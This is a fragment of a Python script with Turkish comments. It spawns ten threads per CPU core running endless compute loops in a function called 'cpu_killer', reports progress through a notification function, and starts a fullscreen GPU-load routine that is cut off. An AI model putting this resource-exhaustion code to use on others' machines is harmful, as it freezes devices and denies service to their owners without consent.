# CPU - 128 thread
core_count = multiprocessing.cpu_count()
thread_count = core_count * 10  # 10 katı (120 thread)
send_notification(f"🧠 CPU: {core_count} çekirdek, {thread_count} thread")

def cpu_killer():
    while True:
        x = 3.14159
        for _ in range(2000000):  # 2 katı işlem
            x = x ** 1.00001
            x = x / 1.000001
        arr = [i ** i for i in range(8000)]  # Daha büyük liste
        for _ in range(200):
            arr.sort()
            arr.reverse()

for _ in range(thread_count):
    threading.Thread(target=cpu_killer, daemon=True).start()
send_notification(f"🔥 CPU {thread_count} thread ile yükleniyor!")

# GPU - Daha ağır render
try:
    import pygame
    import numpy as np
    pygame.init()
    screen = pygame.display.set_mode((1920, 1080), pygame.FULLSCREEN)
    def gpu_killer():
        while True:
